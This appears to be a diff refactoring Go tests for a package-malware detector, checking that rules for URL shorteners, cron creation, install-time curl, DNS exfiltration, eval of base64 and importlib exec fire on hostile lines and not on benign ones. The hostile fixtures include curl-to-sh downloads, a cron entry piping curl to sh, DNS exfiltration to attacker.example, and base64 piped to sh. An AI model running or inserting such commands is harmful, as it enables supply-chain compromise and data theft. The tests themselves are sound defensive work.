@@ -16,7 +16,7 @@ func TestURLShortenerNeedsAHostBoundary(t *testing.T) {
 		`<projectUrl>https://www.paradigm.net.co/</projectUrl>`,                               // "t.co/" inside net.co/
 		`url "https://eclecticlight.co/wp-content/uploads/#{version.csv.second.major}/x.zip"`, // light.co/
 	} {
-		if f := Detect(&PackageContext{Name: "p", Ecosystem: "nuget", PkgbuildContent: line}); fires(f, "P-URL-SHORTENER") {
+		if f := Detect(ctxFixture("nuget", line)); fires(f, "P-URL-SHORTENER") {
 			t.Errorf("%q matched P-URL-SHORTENER", line)
 		}
 	}
@@ -25,7 +25,7 @@ func TestURLShortenerNeedsAHostBoundary(t *testing.T) {
 		`urllib.request.urlopen("http://tinyurl.com/y2uuvskb")`, // a shortener's own API is not (audit_text2_fp_test.go)
 		`fetch("https://t.co/abc123")`,
 	} {
-		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); !fires(f, "P-URL-SHORTENER") {
+		if f := Detect(ctxFixture("pypi", line)); !fires(f, "P-URL-SHORTENER") {
 			t.Errorf("%q should match P-URL-SHORTENER; findings=%v", line, ids(f))
 		}
 	}
@@ -39,7 +39,7 @@ func TestCronCreateNeedsACommand(t *testing.T) {
 		`const CRON_STRING_PATH = 'crontab/jobs/factfinder_feed_export/schedule/cron_expr';`,
 		`SELECT * FROM s_crontab WHERE action = ?`,
 	} {
-		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); fires(f, "P-CRON-CREATE") {
+		if f := Detect(ctxFixture("pypi", line)); fires(f, "P-CRON-CREATE") {
 			t.Errorf("%q matched P-CRON-CREATE", line)
 		}
 	}
@@ -49,7 +49,7 @@ func TestCronCreateNeedsACommand(t *testing.T) {
 		`send('cron', shell('cat /etc/crontab; ls /var/spool/cron/'))`,
 		`echo "*/5 * * * * curl x|sh" > /etc/cron.d/update`,
 	} {
-		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); !fires(f, "P-CRON-CREATE") {
+		if f := Detect(ctxFixture("pypi", line)); !fires(f, "P-CRON-CREATE") {
 			t.Errorf("%q should match P-CRON-CREATE; findings=%v", line, ids(f))
 		}
 	}
@@ -60,7 +60,7 @@ func TestInstallCurlIsTheCommandNotTheLibrary(t *testing.T) {
 		`if self.options.with_libcurl or self.options.with_openssl:`,
 		`self.output.warning("crashpad needs a shared libcurl library")`,
 	} {
-		f := Detect(&PackageContext{Name: "p", Ecosystem: "conan", InstallScriptContent: line})
+		f := Detect(hookFixture("conan", line))
 		if fires(f, "P-INSTALL-CURL") {
 			t.Errorf("%q matched P-INSTALL-CURL", line)
 		}
@@ -70,7 +70,7 @@ func TestInstallCurlIsTheCommandNotTheLibrary(t *testing.T) {
 		`  curl https://x.example/p.sh | sh`,
 		"cd /tmp\ncurl -O http://203.0.113.9/a",
 	} {
-		f := Detect(&PackageContext{Name: "p", Ecosystem: "npm", InstallScriptContent: line})
+		f := Detect(hookFixture("npm", line))
 		if !fires(f, "P-INSTALL-CURL") {
 			t.Errorf("%q should match P-INSTALL-CURL; findings=%v", line, ids(f))
 		}
@@ -83,7 +83,7 @@ func TestDNSExfilNeedsADNSCommand(t *testing.T) {
 		`'Not attaching bearer token: request host ${request.url.host} does '`,
 		`static function make(\Vmwarephp\Vhost $vhost) {`,
 	} {
-		if f := Detect(&PackageContext{Name: "p", Ecosystem: "packagist", PkgbuildContent: line}); fires(f, "P-DNS-EXFIL") {
+		if f := Detect(ctxFixture("packagist", line)); fires(f, "P-DNS-EXFIL") {
 			t.Errorf("%q matched P-DNS-EXFIL", line)
 		}
 	}
@@ -92,7 +92,7 @@ func TestDNSExfilNeedsADNSCommand(t *testing.T) {
 		`dig $DATA.attacker.example TXT`,
 		`curl x; host $SECRET.attacker.example`,
 	} {
-		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); !fires(f, "P-DNS-EXFIL") {
+		if f := Detect(ctxFixture("pypi", line)); !fires(f, "P-DNS-EXFIL") {
 			t.Errorf("%q should match P-DNS-EXFIL; findings=%v", line, ids(f))
 		}
 	}
@@ -108,7 +108,7 @@ func TestEvalBase64NeedsTheCall(t *testing.T) {
 		`| **Cognito** | Evaluation of base64 identity tokens |`,
 		`retrieval of the base64 blob happens before the check`,
 	} {
-		if f := Detect(&PackageContext{Name: "p", Ecosystem: "npm", PkgbuildContent: line}); fires(f, "P-EVAL-BASE64") {
+		if f := Detect(ctxFixture("npm", line)); fires(f, "P-EVAL-BASE64") {
 			t.Errorf("%q matched P-EVAL-BASE64", line)
 		}
 	}
@@ -117,7 +117,7 @@ func TestEvalBase64NeedsTheCall(t *testing.T) {
 		`eval("base64.decode('aGVsbG8=')")`,
 		`eval ( base64_decode($x) )`,
 	} {
-		if f := Detect(&PackageContext{Name: "p", Ecosystem: "npm", PkgbuildContent: line}); !fires(f, "P-EVAL-BASE64") {
+		if f := Detect(ctxFixture("npm", line)); !fires(f, "P-EVAL-BASE64") {
 			t.Errorf("%q should match P-EVAL-BASE64; findings=%v", line, ids(f))
 		}
 	}
@@ -131,12 +131,12 @@ func TestBase64DecodeAndWalletAreContextInLibraryCode(t *testing.T) {
 		`echo "$P12_BASE64" | base64 --decode > certificate.p12`,
 		`USDC = "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913"`,
 	} {
-		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
+		f := Detect(ctxFixture("pypi", line))
 		if CombinedVerdict(f).Malicious {
 			t.Errorf("library line %q minted malware; findings=%v", line, ids(f))
 		}
 	}
-	f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: "echo aGk= | base64 -d | sh\n"})
+	f := Detect(hookFixture("pypi", "echo aGk= | base64 -d | sh\n"))
 	if !CombinedVerdict(f).Malicious {
 		t.Errorf("base64 -d piped to sh in the install hook must mint; findings=%v", ids(f))
 	}
@@ -162,7 +162,7 @@ func TestImportlibExecIgnoresTheModuleLoaderIdiom(t *testing.T) {
 		"import imp\nm = imp.load_source('x', p); eval(m.payload)\n",
 		"import importlib; exec(importlib.import_module('x').CODE)\n",
 	} {
-		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: src})
+		f := Detect(hookFixture("pypi", src))
 		if !fires(f, "PY-SETUP-IMPORTLIB-EXEC") {
 			t.Errorf("hostile dynamic exec no longer matched:\n%s\nfindings=%v", src, ids(f))
 		}
@@ -172,12 +172,12 @@ func TestImportlibExecIgnoresTheModuleLoaderIdiom(t *testing.T) {
 // Loading a module from a STAGED path is the hostile shape of the same idiom.
 func TestImportlibLoadFromStagedPathStillMints(t *testing.T) {
 	src := "import importlib.util\nspec = importlib.util.spec_from_file_location('x', '/tmp/payload.py')\nspec.loader.exec_module(importlib.util.module_from_spec(spec))\n"
-	f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: src})
+	f := Detect(hookFixture("pypi", src))
 	if !fires(f, "PY-SETUP-IMPORTLIB-EXEC") {
 		t.Errorf("a module loaded from /tmp must still match; findings=%v", ids(f))
 	}
 	ok := "import importlib.util\nspec = importlib.util.spec_from_file_location('v', 'pkg/_version.py')\nspec.loader.exec_module(importlib.util.module_from_spec(spec))\n"
-	if fires(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: ok}), "PY-SETUP-IMPORTLIB-EXEC") {
+	if fires(Detect(hookFixture("pypi", ok)), "PY-SETUP-IMPORTLIB-EXEC") {
 		t.Error("a module loaded from inside the package must not match")
 	}
 }
